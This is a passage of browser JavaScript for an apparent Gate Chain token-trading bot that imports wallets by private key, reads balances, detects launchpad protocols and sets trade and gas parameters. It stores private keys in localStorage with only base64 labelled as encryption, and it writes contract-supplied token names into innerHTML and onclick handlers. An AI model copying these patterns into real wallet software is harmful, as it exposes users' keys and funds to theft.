        let stats = {
            totalTrades: 0,
            totalTokenTypes: 0
        };
        let fetchTokenTimeout = null;
        let currentGasSpeed = 'FAST'; // 默认选择Fast
        let currentTokenInfo = null; // 当前选择的代币信息
        let tokenPrices = {}; // 代币价格缓存

        // 初始化
        async function init() {
            loadWallets();
            updateStats();
            initMouseGlow();
            initGasSettings();
            showToast('🚀 系统启动成功', 'success');
        }

        // 初始化Gas设置
        function initGasSettings() {
            // 设置默认gas速度
            setGasSpeed('FAST');
            
            // 设置默认gas limit
            document.getElementById('gasLimit').value = GAS_CONFIG.DEFAULT_LIMIT;
            
            // 设置默认gas价格
            const speedConfig = GAS_CONFIG.SPEEDS[currentGasSpeed];
            const defaultGasPrice = GAS_CONFIG.DEFAULT_PRICE * speedConfig.multiplier;
            document.getElementById('gasPrice').value = Math.round(defaultGasPrice);
            
            // 直接使用默认价格，不获取RPC
            console.log(`使用默认Gas价格: ${defaultGasPrice} Gwei`);
        }

        // 测试RPC连接
        async function testRpcConnection() {
            try {
                console.log('开始测试RPC连接...');
                console.log('主RPC:', CONFIG.rpcUrl);
                console.log('备用RPC:', CONFIG.backupRpcUrl);
                
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                // 测试基本连接
                console.log('测试网络连接...');
                const network = await provider.getNetwork();
                console.log('RPC连接成功，网络信息:', network);
                
                // 测试获取最新区块
                console.log('测试获取区块号...');
                const blockNumber = await provider.getBlockNumber();
                console.log('最新区块号:', blockNumber);
                
                // 测试获取Gas价格
                console.log('测试获取Gas价格...');
                let gasPrice;
                try {
                    // 方法1: 尝试直接RPC调用
                    console.log('尝试方法1: provider.send("eth_gasPrice")');
                    gasPrice = await provider.send('eth_gasPrice', []);
                    console.log('方法1成功:', gasPrice);
                } catch (gasError1) {
                    console.log('方法1失败:', gasError1.message);
                    try {
                        // 方法2: 尝试getGasPrice方法
                        console.log('尝试方法2: provider.getGasPrice()');
                        if (typeof provider.getGasPrice === 'function') {
                            gasPrice = await provider.getGasPrice();
                            console.log('方法2成功:', gasPrice);
                        } else {
                            throw new Error('getGasPrice方法不存在');
                        }
                    } catch (gasError2) {
                        console.log('方法2失败:', gasError2.message);
                        try {
                            // 方法3: 尝试fetch直接调用
                            console.log('尝试方法3: fetch直接调用');
                            const response = await fetch(CONFIG.rpcUrl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    jsonrpc: '2.0',
                                    method: 'eth_gasPrice',
                                    params: [],
                                    id: 1
                                })
                            });
                            const data = await response.json();
                            if (data.result) {
                                gasPrice = data.result;
                                console.log('方法3成功:', gasPrice);
                            } else {
                                throw new Error('RPC返回错误: ' + (data.error?.message || '未知错误'));
                            }
                        } catch (gasError3) {
                            console.log('方法3失败:', gasError3.message);
                            throw new Error('所有方法都失败');
                        }
                    }
                }
                console.log('Gas价格 (wei):', gasPrice.toString());
                console.log('Gas价格 (Gwei):', ethers.formatUnits(gasPrice, 'gwei'));
                
                // 获取Gas价格
                await getDynamicGasPrice();
                
            } catch (error) {
                console.error('RPC连接测试失败:', error);
                console.error('错误详情:', {
                    message: error.message,
                    code: error.code,
                    reason: error.reason,
                    stack: error.stack
                });
                showToast('⚠️ RPC连接失败，使用默认Gas价格', 'error');
            }
        }

        // 初始化鼠标跟随光效
        function initMouseGlow() {
            const glow = document.createElement('div');
            glow.className = 'mouse-glow';
            document.body.appendChild(glow);

            document.addEventListener('mousemove', function(e) {
                glow.style.left = e.clientX - 150 + 'px';
                glow.style.top = e.clientY - 150 + 'px';
                glow.style.opacity = '1';
            });

            document.addEventListener('mouseleave', function() {
                glow.style.opacity = '0';
            });
        }

        // Toast通知
        function showToast(message, type = 'info') {
            const existingToast = document.querySelector('.toast');
            if (existingToast) {
                existingToast.remove();
            }
            
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            
            const iconMap = {
                success: '✅',
                error: '❌',
                info: 'ℹ️'
            };
            
            toast.innerHTML = '<div style="display: flex; align-items: center; gap: 10px;">' +
                '<span style="font-size: 18px;">' + iconMap[type] + '</span>' +
                '<span>' + message + '</span>' +
                '</div>';
            
            document.body.appendChild(toast);
            
            setTimeout(function() {
                toast.style.animation = 'toastSlideIn 0.3s ease reverse';
                setTimeout(function() { 
                    if (toast.parentNode) {
                        toast.parentNode.removeChild(toast);
                    }
                }, 300);
            }, 3000);
        }

        // 钱包管理
        function loadWallets() {
            const stored = localStorage.getItem('gtbot_wallets');
            if (stored) {
                try {
                    wallets = JSON.parse(stored);
                    renderWallets();
                    scanAllWalletTokens();
                } catch (e) {
                    console.error('Failed to load wallets:', e);
                }
            }
        }

        function saveWallets() {
            localStorage.setItem('gtbot_wallets', JSON.stringify(wallets));
        }

        async function renderWallets() {
            const container = document.getElementById('walletList');
            container.innerHTML = '';
            
            let activeCount = 0;
            
            for (let i = 0; i < wallets.length; i++) {
                const wallet = wallets[i];
                if (wallet.active) activeCount++;
                
                const gtBalance = await getBalance(wallet.address);
                const tokens = walletTokens[wallet.address] || [];
                
                const walletDiv = document.createElement('div');
                walletDiv.className = 'wallet-item' + (wallet.active ? ' active' : '');
                
                let tokensHtml = '';
                if (tokens.length > 0) {
                    tokensHtml = '<div class="token-list">' +
                        '<div class="token-list-title">持有代币 (' + tokens.length + ')</div>';
                    
                    for (let j = 0; j < tokens.length; j++) {
                        const token = tokens[j];
                        tokensHtml += '<div class="token-item" onclick="showTokenDetails(\'' + 
                            token.address + '\', \'' + token.symbol + '\', \'' + token.name + 
                            '\', \'' + token.balance + '\', \'' + token.decimals + '\', \'' + 
                            wallet.address + '\')">' +
                            '<div class="token-logo">' + token.symbol.substring(0, 2) + '</div>' +
                            '<div class="token-info">' +
                                '<div class="token-symbol">' + token.symbol + '</div>' +
                                '<div class="token-name">' + token.name + '</div>' +
                            '</div>' +
                            '<div class="token-balance">' + formatTokenBalance(token.balance, token.decimals) + '</div>' +
                            '<button class="copy-btn" onclick="copyAddress(event, \'' + token.address + '\')">复制</button>' +
                        '</div>';
                    }
                    tokensHtml += '</div>';
                }
                
                walletDiv.innerHTML = 
                    '<div class="wallet-header">' +
                        '<div class="wallet-address">' + wallet.address.substring(0, 6) + '...' + wallet.address.substring(38) + '</div>' +
                        '<div class="toggle-switch' + (wallet.active ? ' active' : '') + '" onclick="toggleWallet(\'' + wallet.address + '\')"></div>' +
                    '</div>' +
                    '<div class="wallet-balances">' +
                        '<div class="balance-item">' +
                            '<span class="balance-label">GT:</span>' +
                            '<span class="balance-value">' + parseFloat(gtBalance).toFixed(4) + '</span>' +
                        '</div>' +
                    '</div>' +
                    tokensHtml;
                
                container.appendChild(walletDiv);
            }
            
            document.getElementById('activeWallets').textContent = activeCount;
            updateActiveWalletsStatus();
        }

        async function getBalance(address) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                const balance = await provider.getBalance(address);
                return ethers.formatEther(balance);
            } catch (e) {
                return '0';
            }
        }

        // 扫描钱包代币
        async function scanAllWalletTokens() {
            for (let i = 0; i < wallets.length; i++) {
                await scanWalletTokens(wallets[i].address);
            }
            updateTokenTypeCount();
        }

        async function scanWalletTokens(walletAddress) {
            try {
                const tokens = [];
                
                // 从缓存中添加已知代币
                for (const address in tokenCache) {
                    const tokenInfo = tokenCache[address];
                    try {
                        const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                            chainId: CONFIG.chainId,
                            name: 'Gate Chain'
                        });
                        const tokenContract = new ethers.Contract(address, ERC20_ABI, provider);
                        const balance = await tokenContract.balanceOf(walletAddress);
                        
                        if (balance > 0) {
                            tokens.push({
                                address: address,
                                symbol: tokenInfo.symbol,
                                name: tokenInfo.name,
                                decimals: tokenInfo.decimals,
                                balance: balance.toString()
                            });
                        }
                    } catch (e) {
                        // 忽略错误
                    }
                }
                
                walletTokens[walletAddress] = tokens;
            } catch (e) {
                console.error('Failed to scan wallet tokens:', e);
                walletTokens[walletAddress] = [];
            }
        }

        function updateTokenTypeCount() {
            const allTokens = new Set();
            for (const address in walletTokens) {
                const tokens = walletTokens[address];
                for (let i = 0; i < tokens.length; i++) {
                    allTokens.add(tokens[i].address);
                }
            }
            stats.totalTokenTypes = allTokens.size;
            document.getElementById('tokenTypes').textContent = stats.totalTokenTypes;
        }

        function formatTokenBalance(balance, decimals) {
            const formatted = ethers.formatUnits(balance, decimals);
            const num = parseFloat(formatted);
            if (num === 0) return '0';
            if (num < 0.0001) return '<0.0001';
            if (num < 1) return num.toFixed(4);
            if (num < 1000) return num.toFixed(2);
            if (num < 1000000) return (num / 1000).toFixed(2) + 'K';
            return (num / 1000000).toFixed(2) + 'M';
        }

        // 复制地址
        function copyAddress(event, address) {
            event.stopPropagation();
            navigator.clipboard.writeText(address);
            showToast('📋 地址已复制', 'success');
        }

        // 显示代币详情
        function showTokenDetails(address, symbol, name, balance, decimals, walletAddress) {
            event.stopPropagation();
            
            document.getElementById('tokenDetailsLogo').textContent = symbol.substring(0, 2);
            document.getElementById('tokenDetailsName').textContent = name;
            document.getElementById('tokenDetailsSymbol').textContent = symbol;
            document.getElementById('tokenDetailsAddress').textContent = address;
            document.getElementById('tokenDetailsBalance').textContent = formatTokenBalance(balance, decimals);
            document.getElementById('tokenDetailsWallet').textContent = 
                walletAddress.substring(0, 6) + '...' + walletAddress.substring(38);
            
            window.currentTokenDetails = {
                address: address,
                symbol: symbol,
                name: name,
                balance: balance,
                decimals: decimals,
                walletAddress: walletAddress
            };
            
            document.getElementById('tokenDetailsModal').style.display = 'flex';
        }

        // 关闭代币详情模态框
        function closeTokenDetailsModal() {
            document.getElementById('tokenDetailsModal').style.display = 'none';
            window.currentTokenDetails = null;
        }

        // 复制代币合约地址
        function copyTokenAddress() {
            if (window.currentTokenDetails) {
                navigator.clipboard.writeText(window.currentTokenDetails.address);
                showToast('📋 合约地址已复制', 'success');
            }
        }

        // 复制钱包地址
        function copyWalletAddress() {
            if (window.currentTokenDetails) {
                navigator.clipboard.writeText(window.currentTokenDetails.walletAddress);
                showToast('📋 钱包地址已复制', 'success');
            }
        }

        // 从详情中选择代币
        function selectTokenFromDetails() {
            if (window.currentTokenDetails) {
                const tokenDetails = window.currentTokenDetails;
                
                document.getElementById('tokenAddress').value = tokenDetails.address;
                
                tokenCache[tokenDetails.address] = {
                    address: tokenDetails.address,
                    symbol: tokenDetails.symbol,
                    name: tokenDetails.name,
                    decimals: tokenDetails.decimals
                };
                
                displayTokenInfo(tokenCache[tokenDetails.address]);
                
                closeTokenDetailsModal();
                
                showToast('已选择 ' + tokenDetails.symbol, 'success');
            }
        }

        // 显示添加钱包模态框
        function showAddWalletModal() {
            document.getElementById('addWalletModal').style.display = 'flex';
        }

        function closeAddWalletModal() {
            document.getElementById('addWalletModal').style.display = 'none';
            document.getElementById('privateKeyInput').value = '';
        }

        // 导入钱包
        async function importWallet() {
            let privateKey = document.getElementById('privateKeyInput').value.trim();
            
            // 处理私钥格式
            if (!privateKey) {
                showToast('请输入私钥', 'error');
                return;
            }
            
            // 如果私钥没有0x前缀，自动添加
            if (!privateKey.startsWith('0x')) {
                privateKey = '0x' + privateKey;
            }
            
            // 验证私钥长度（64位十六进制 + 0x前缀 = 66位）
            if (privateKey.length !== 66) {
                showToast('私钥格式错误，应为64位十六进制字符串', 'error');
                return;
            }
            
            // 显示加载状态
            const importBtn = document.querySelector('.modal-confirm');
            const originalText = importBtn.textContent;
            importBtn.innerHTML = '<span class="loading-spinner"></span> 导入中...';
            importBtn.disabled = true;
            
            try {
                const wallet = new ethers.Wallet(privateKey);
                const address = wallet.address;
                
                // 检查是否已存在
                for (let i = 0; i < wallets.length; i++) {
                    if (wallets[i].address === address) {
                        showToast('该钱包已存在', 'error');
                        return;
                    }
                }
                
                const encryptedKey = btoa(privateKey);
                
                wallets.push({
                    address: address,
                    encryptedKey: encryptedKey,
                    active: false
                });
                
                saveWallets();
                await scanWalletTokens(address);
                renderWallets();
                closeAddWalletModal();
                showToast('✅ 钱包导入成功', 'success');
            } catch (e) {
                showToast('私钥无效', 'error');
                console.error(e);
            } finally {
                // 恢复按钮状态
                importBtn.textContent = originalText;
                importBtn.disabled = false;
            }
        }

        // 切换钱包状态
        function toggleWallet(address) {
            event.stopPropagation();
            for (let i = 0; i < wallets.length; i++) {
                if (wallets[i].address === address) {
                    wallets[i].active = !wallets[i].active;
                    saveWallets();
                    renderWallets();
                    break;
                }
            }
        }

        // 更新活跃钱包状态栏
        function updateActiveWalletsStatus() {
            const activeWallets = wallets.filter(function(w) { return w.active; });
            const statusElement = document.getElementById('activeWalletsStatus');
            const countElement = document.getElementById('activeWalletsCount');
            const listElement = document.getElementById('statusWalletsList');
            
            if (activeWallets.length > 0) {
                statusElement.style.display = 'block';
                countElement.textContent = activeWallets.length;
                
                let walletsHtml = '';
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    walletsHtml += '<div class="status-wallet-item">' +
                        wallet.address.substring(0, 6) + '...' + wallet.address.substring(38) +
                        '</div>';
                }
                listElement.innerHTML = walletsHtml;
            } else {
                statusElement.style.display = 'none';
            }
        }

        // 代币协议识别函数
        async function detectTokenProtocol(tokenAddress) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                // 方法1: 检查合约是否有sellTokens函数（GTLAUNCH特征）
                try {
                    const sellContract = new ethers.Contract(tokenAddress, ['function sellTokens(uint256 amount) public'], provider);
                    // 尝试调用sellTokens函数（不发送交易，只是检查函数是否存在）
                    await sellContract.sellTokens.staticCall(0);
                    console.log('检测到GTLAUNCH协议代币');
                    return 'GTLAUNCH';
                } catch (error) {
                    // sellTokens函数不存在，继续检查其他特征
                }
                
                // 方法2: 检查合约是否有特定的函数选择器
                try {
                    // 检查是否有买入函数选择器 0xd0febe4c
                    const buyContract = new ethers.Contract(tokenAddress, ['function buy() public payable'], provider);
                    await buyContract.buy.staticCall({ value: 0 });
                    console.log('检测到GTLAUNCH协议代币（通过买入函数）');
                    return 'GTLAUNCH';
                } catch (error) {
                    // 买入函数不存在
                }
                
                // 方法3: 检查合约代码中是否包含特定字节码
                try {
                    const code = await provider.getCode(tokenAddress);
                    // GTLAUNCH合约通常包含特定的字节码模式
                    if (code.includes('d0febe4c') || code.includes('6c11bcd3')) {
                        console.log('检测到GTLAUNCH协议代币（通过字节码）');
                        return 'GTLAUNCH';
                    }
                } catch (error) {
                    console.warn('无法获取合约代码:', error.message);
                }
                
                // 方法4: 检查是否支持DYOR内盘的swap函数
                try {
                    // 检查是否有swap相关的函数
                    const swapContract = new ethers.Contract(tokenAddress, [
                        'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)'
                    ], provider);
                    // 这里只是检查函数是否存在，不实际调用
                    console.log('检测到DYOR协议代币');
                    return 'DYOR_INTERNAL';
                } catch (error) {
                    // 不是DYOR协议
                }
                
                // 默认返回未知协议
                console.log('无法识别代币协议，默认为DYOR_INTERNAL');
                return 'DYOR_INTERNAL';
                
            } catch (error) {
                console.error('代币协议检测失败:', error);
                return 'DYOR_INTERNAL'; // 默认返回DYOR_INTERNAL
            }
        }

        // 自动选择正确的内盘协议
        async function autoSelectInternalProtocol(tokenAddress) {
            const detectedProtocol = await detectTokenProtocol(tokenAddress);
            console.log(`检测到代币协议: ${detectedProtocol}`);
            
            // 确保选择内盘平台
            if (selectedPlatform !== 'internal') {
                console.log('自动切换到内盘平台');
                selectedPlatform = 'internal';
                // 更新UI显示
                const tabs = document.querySelectorAll('.platform-tab');
                for (let i = 0; i < tabs.length; i++) {
                    tabs[i].classList.remove('active');
                }
                // 激活内盘标签
                const internalTab = document.querySelector('.platform-tab[onclick*="internal"]');
                if (internalTab) {
                    internalTab.classList.add('active');
                }
                
                // 显示内盘选项
                document.getElementById('externalDexOptions').style.display = 'none';
                document.getElementById('internalDexOptions').style.display = 'grid';
                document.getElementById('hexDataGroup').style.display = 'block';
            }
            
            // 如果当前选择的是内盘，自动切换到检测到的协议
            if (selectedPlatform === 'internal') {
                if (selectedDex !== detectedProtocol) {
                    console.log(`自动切换协议: ${selectedDex} -> ${detectedProtocol}`);
                    selectDex(detectedProtocol, 'internal');
                    showToast(`🔍 自动检测到${detectedProtocol === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR'}协议，已自动切换`, 'info');
                }
            }
            
            return detectedProtocol;
        }

        // 获取合约余额信息
        async function getContractBalance(tokenAddress, protocol) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                if (protocol === 'GTLAUNCH') {
                    // GTLAUNCH内盘：获取合约的GT余额
                    const gtBalance = await provider.getBalance(tokenAddress);
                    const gtBalanceFormatted = parseFloat(ethers.formatEther(gtBalance));
                    
                    return {
                        type: 'GT',
                        balance: gtBalance,
                        formattedBalance: gtBalanceFormatted,
                        label: 'GT余额'
                    };
                } else if (protocol === 'DYOR_INTERNAL') {
                    // DYOR内盘：获取合约的WGT余额
                    const WGT_ADDRESS = '0x672f30407a71fa8737a3a14474ff37e09c7fc44a'; // Gate Chain WGT地址
                    const wgtContract = new ethers.Contract(WGT_ADDRESS, ERC20_ABI, provider);
                    const wgtBalance = await wgtContract.balanceOf(tokenAddress);
                    const wgtBalanceFormatted = parseFloat(ethers.formatEther(wgtBalance));
                    
                    return {
                        type: 'WGT',
                        balance: wgtBalance,
                        formattedBalance: wgtBalanceFormatted,
                        label: 'WGT余额'
                    };
                }
                
                return null;
            } catch (error) {
                console.error('获取合约余额失败:', error);
                return null;
            }
        }

        // 显示合约余额信息
        function displayContractBalance(balanceInfo) {
            const contractBalanceDisplay = document.getElementById('contractBalanceDisplay');
            const balanceLabel = document.getElementById('balanceLabel');
            const balanceValue = document.getElementById('balanceValue');
            
            if (balanceInfo) {
                contractBalanceDisplay.style.display = 'block';
                balanceLabel.textContent = balanceInfo.label;
                balanceValue.textContent = balanceInfo.formattedBalance.toFixed(4);
            } else {
                contractBalanceDisplay.style.display = 'none';
            }
        }

        // 获取代币信息
        // 防抖查询代币信息
        function debounceFetchTokenInfo() {
            // 清除之前的定时器
            if (fetchTokenTimeout) {
                clearTimeout(fetchTokenTimeout);
            }
            
            const tokenAddressInput = document.getElementById('tokenAddress');
            const tokenAddress = tokenAddressInput.value.trim();
            const tokenInfoDisplay = document.getElementById('tokenInfoDisplay');
            
            // 重置输入框状态
            tokenAddressInput.classList.remove('loading', 'error', 'success');
            
            // 验证地址格式
            if (!tokenAddress) {
                tokenInfoDisplay.style.display = 'none';
                document.getElementById('tokenDisplay').classList.remove('active');
                return;
            }
            
            if (!tokenAddress.startsWith('0x')) {
                tokenAddressInput.classList.add('error');
                showTokenInfoError('地址格式错误，必须以0x开头');
                return;
            }
            
            if (tokenAddress.length < 42) {
                tokenAddressInput.classList.add('loading');
                showTokenInfoLoading('地址长度不足...');
                return;
            }
            
            if (tokenAddress.length === 42) {
                // 显示加载状态
                tokenAddressInput.classList.add('loading');
                showTokenInfoLoading('正在查询代币信息...');
                
                // 设置新的定时器，500ms后执行查询
                fetchTokenTimeout = setTimeout(function() {
                    fetchTokenInfo();
                }, 500);
            }
        }

        // 显示代币信息加载状态
        function showTokenInfoLoading(message) {
            const tokenInfoDisplay = document.getElementById('tokenInfoDisplay');
            const tokenInfoLogo = document.getElementById('tokenInfoLogo');
            const tokenInfoName = document.getElementById('tokenInfoName');
            const tokenInfoSymbol = document.getElementById('tokenInfoSymbol');
            const statusIndicator = document.getElementById('statusIndicator');
            const statusText = document.getElementById('statusText');
            
            tokenInfoDisplay.style.display = 'block';
            tokenInfoLogo.innerHTML = '<span class="loading-spinner"></span>';
            tokenInfoName.textContent = '查询中...';
            tokenInfoSymbol.textContent = 'LOADING';
            statusIndicator.className = 'status-indicator loading';
            statusText.textContent = message;
        }

        // 显示代币信息错误状态
        function showTokenInfoError(message) {
            const tokenInfoDisplay = document.getElementById('tokenInfoDisplay');
            const tokenInfoLogo = document.getElementById('tokenInfoLogo');
            const tokenInfoName = document.getElementById('tokenInfoName');
            const tokenInfoSymbol = document.getElementById('tokenInfoSymbol');
            const statusIndicator = document.getElementById('statusIndicator');
            const statusText = document.getElementById('statusText');
            
            tokenInfoDisplay.style.display = 'block';
            tokenInfoLogo.textContent = '❌';
            tokenInfoName.textContent = '查询失败';
            tokenInfoSymbol.textContent = 'ERROR';
            statusIndicator.className = 'status-indicator error';
            statusText.textContent = message;
        }

        // 显示代币信息成功状态
        function showTokenInfoSuccess(tokenInfo) {
            const tokenInfoDisplay = document.getElementById('tokenInfoDisplay');
            const tokenInfoLogo = document.getElementById('tokenInfoLogo');
            const tokenInfoName = document.getElementById('tokenInfoName');
            const tokenInfoSymbol = document.getElementById('tokenInfoSymbol');
            const statusIndicator = document.getElementById('statusIndicator');
            const statusText = document.getElementById('statusText');
            
            tokenInfoDisplay.style.display = 'block';
            tokenInfoLogo.textContent = tokenInfo.symbol.substring(0, 2);
            tokenInfoName.textContent = tokenInfo.name;
            tokenInfoSymbol.textContent = tokenInfo.symbol;
            statusIndicator.className = 'status-indicator success';
            statusText.textContent = '查询成功';
            
            // 显示价格信息区域
            document.getElementById('priceInfoDisplay').style.display = 'block';
        }

        // 显示代币查询加载状态（保留原有函数兼容性）
        function showTokenLoadingState() {
            const tokenDisplay = document.getElementById('tokenDisplay');
            const tokenLogo = document.getElementById('tokenLogo');
            const tokenName = document.getElementById('tokenName');
            const tokenSymbol = document.getElementById('tokenSymbol');
            
            tokenLogo.innerHTML = '<span class="loading-spinner"></span>';
            tokenName.textContent = '查询中...';
            tokenSymbol.textContent = 'LOADING';
            tokenDisplay.classList.add('active');
        }

        async function fetchTokenInfo() {
            const tokenAddress = document.getElementById('tokenAddress').value.trim();
            
            // 验证地址格式
            if (!tokenAddress || !tokenAddress.startsWith('0x') || tokenAddress.length !== 42) {
                document.getElementById('tokenDisplay').classList.remove('active');
                currentTokenInfo = null;
                return;
            }
            
            // 检查缓存
            if (tokenCache[tokenAddress]) {
                currentTokenInfo = tokenCache[tokenAddress];
                displayTokenInfo(tokenCache[tokenAddress]);
                await renderWallets();
                await updateTokenInfoDisplay(); // 更新价格和余额信息
                return;
            }
            
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                
                // 并行获取代币信息
                const [name, symbol, decimals] = await Promise.all([
                    tokenContract.name().catch(function() { return 'Unknown Token'; }),
                    tokenContract.symbol().catch(function() { return 'UNKNOWN'; }),
                    tokenContract.decimals().catch(function() { return 18; })
                ]);
                
                const tokenInfo = { 
                    address: tokenAddress, 
                    name: name, 
                    symbol: symbol, 
                    decimals: decimals 
                };
                
                // 缓存代币信息
                tokenCache[tokenAddress] = tokenInfo;
                currentTokenInfo = tokenInfo;
                
                // 显示代币信息
                displayTokenInfo(tokenInfo);
                showTokenInfoSuccess(tokenInfo);
                
                // 自动检测代币协议并切换
                const detectedProtocol = await autoSelectInternalProtocol(tokenAddress);
                
                // 将协议信息保存到代币信息中
                tokenInfo.protocol = detectedProtocol;
                tokenCache[tokenAddress].protocol = detectedProtocol;
                
                // 获取合约余额信息（仅内盘）
                if (selectedPlatform === 'internal') {
                    const contractBalanceInfo = await getContractBalance(tokenAddress, detectedProtocol);
                    displayContractBalance(contractBalanceInfo);
                } else {
                    // 外盘隐藏合约余额显示
                    document.getElementById('contractBalanceDisplay').style.display = 'none';
                }
                
                // 更新钱包列表
                await renderWallets();
                
                // 更新价格和余额信息
                await updateTokenInfoDisplay();
                
                // 显示成功提示
                showToast(`✅ 成功获取代币信息: ${symbol}`, 'success');
                
                // 设置输入框成功状态
                document.getElementById('tokenAddress').classList.remove('loading');
                document.getElementById('tokenAddress').classList.add('success');
                
            } catch (e) {
                console.error('Failed to fetch token info:', e);
                document.getElementById('tokenDisplay').classList.remove('active');
                currentTokenInfo = null;
                showTokenInfoError('无法获取代币信息，请检查合约地址');
                showToast('❌ 无法获取代币信息，请检查合约地址', 'error');
                
                // 设置输入框错误状态
                document.getElementById('tokenAddress').classList.remove('loading');
                document.getElementById('tokenAddress').classList.add('error');
            }
        }

        // 显示代币信息
        function displayTokenInfo(tokenInfo) {
            // 更新卖出窗口的标签
            document.getElementById('sellAmountLabel').textContent = `卖出代币数量 (${tokenInfo.symbol})`;
            
            // 显示协议信息
            if (tokenInfo.protocol) {
                const protocolElement = document.getElementById('tokenInfoProtocol');
                const protocolBadge = document.getElementById('protocolBadge');
                
                protocolElement.style.display = 'block';
                protocolBadge.textContent = tokenInfo.protocol === 'GTLAUNCH' ? 'GTLAUNCH' : 'DYOR';
                protocolBadge.className = `protocol-badge ${tokenInfo.protocol.toLowerCase()}`;
            }
        }

        // 设置买入百分比
        async function setBuyPercentage(percentage) {
            const activeWallets = wallets.filter(function(w) { return w.active; });
            if (activeWallets.length === 0) {
                showToast('请先启用钱包', 'error');
                return;
            }
            
            const balance = await getBalance(activeWallets[0].address);
            const amount = (parseFloat(balance) * percentage / 100).toFixed(4);
            document.getElementById('buyAmount').value = amount;
            
            // 更新买入预计收益
            updateBuyExpected();
        }

        // 设置卖出百分比
        async function setSellPercentage(percentage) {
            if (!currentTokenInfo) {
                showToast('请先选择代币', 'error');
                return;
            }
            
            const activeWallets = wallets.filter(function(w) { return w.active; });
            if (activeWallets.length === 0) {
                showToast('请先启用钱包', 'error');
                return;
            }
            
            const tokenAddress = currentTokenInfo.address;
            const wallet = activeWallets[0];
            const balanceInfo = await getTokenBalance(tokenAddress, wallet.address);
            const tokenAmount = (parseFloat(balanceInfo.formattedBalance) * percentage / 100).toFixed(4);
            document.getElementById('sellAmount').value = tokenAmount;
            
            // 更新卖出预计收益
            updateSellExpected();
        }

        // 更新买入预计收益
        async function updateBuyExpected() {
            const buyExpected = document.getElementById('buyExpected');
            const buySpendGT = document.getElementById('buySpendGT');
            const buyGetTokens = document.getElementById('buyGetTokens');
            
            if (!currentTokenInfo) {
                buyExpected.style.display = 'none';
                return;
            }
            
            const amount = parseFloat(document.getElementById('buyAmount').value) || 0;
            if (amount <= 0) {
                buyExpected.style.display = 'none';
                return;
            }
            
            try {
                // 使用缓存的价格信息
                let priceInfo = window.currentPriceInfo;
                if (!priceInfo) {
                    // GTLAUNCH内盘不显示价格，只显示交易金额
                    if (currentTokenInfo.protocol === 'GTLAUNCH' && selectedPlatform === 'internal') {
                        buySpendGT.textContent = `${amount} GT`;
                        buyGetTokens.textContent = `待计算 ${currentTokenInfo.symbol}`;
                        buyExpected.style.display = 'block';
                        return;
                    }
                    priceInfo = await calculateTokenPrice(currentTokenInfo.address);
                    window.currentPriceInfo = priceInfo;
                }
                
                if (priceInfo.error || priceInfo.pricePerGT === 0) {
                    buySpendGT.textContent = `${amount} GT`;
                    buyGetTokens.textContent = `0.0000 ${currentTokenInfo.symbol}`;
                    buyExpected.style.display = 'block';
                    return;
                }
                
                const expectedTokenAmount = amount * priceInfo.pricePerGT;
                
                buySpendGT.textContent = `${amount} GT`;
                buyGetTokens.textContent = `${expectedTokenAmount.toFixed(4)} ${currentTokenInfo.symbol}`;
                buyExpected.style.display = 'block';
            } catch (error) {
                console.error('Failed to update buy expected:', error);
                buyExpected.style.display = 'none';
            }
        }

        // 更新卖出预计收益
        async function updateSellExpected() {
            const sellExpected = document.getElementById('sellExpected');
            const sellSpendTokens = document.getElementById('sellSpendTokens');
            const sellGetGT = document.getElementById('sellGetGT');
            
            if (!currentTokenInfo) {
                sellExpected.style.display = 'none';
                return;
            }
            
            const amount = parseFloat(document.getElementById('sellAmount').value) || 0;
            if (amount <= 0) {
                sellExpected.style.display = 'none';
                return;
            }
            
            try {
                // 使用缓存的价格信息
                let priceInfo = window.currentPriceInfo;
                if (!priceInfo) {
                    // GTLAUNCH内盘不显示价格，只显示交易金额
                    if (currentTokenInfo.protocol === 'GTLAUNCH' && selectedPlatform === 'internal') {
                        sellSpendTokens.textContent = `${amount} ${currentTokenInfo.symbol}`;
                        sellGetGT.textContent = `待计算 GT`;
                        sellExpected.style.display = 'block';
                        return;
                    }
                    priceInfo = await calculateTokenPrice(currentTokenInfo.address);
                    window.currentPriceInfo = priceInfo;
                }
                
                if (priceInfo.error || priceInfo.pricePerToken === 0) {
                    sellSpendTokens.textContent = `${amount} ${currentTokenInfo.symbol}`;
                    sellGetGT.textContent = `0.000000 GT`;
                    sellExpected.style.display = 'block';
                    return;
                }
                
                const expectedGTAmount = amount * priceInfo.pricePerToken;
                
                sellSpendTokens.textContent = `${amount} ${currentTokenInfo.symbol}`;
                sellGetGT.textContent = `${expectedGTAmount.toFixed(6)} GT`;
                sellExpected.style.display = 'block';
            } catch (error) {
                console.error('Failed to update sell expected:', error);
                sellExpected.style.display = 'none';
            }
        }

        // 设置Gas速度
        function setGasSpeed(speed) {
            currentGasSpeed = speed;
            
            // 更新按钮状态
            const buttons = document.querySelectorAll('.gas-speed-btn');
            buttons.forEach(btn => btn.classList.remove('active'));
            document.getElementById('gas' + speed).classList.add('active');
            
            // 立即更新Gas价格显示
            const speedConfig = GAS_CONFIG.SPEEDS[speed];
            const newGasPrice = GAS_CONFIG.DEFAULT_PRICE * speedConfig.multiplier;
            document.getElementById('gasPrice').value = Math.round(newGasPrice);
            
            // 静默更新，不显示提示
            console.log(`已选择 ${speedConfig.name} 模式 - ${Math.round(newGasPrice)} Gwei`);
        }

        // 获取动态Gas价格
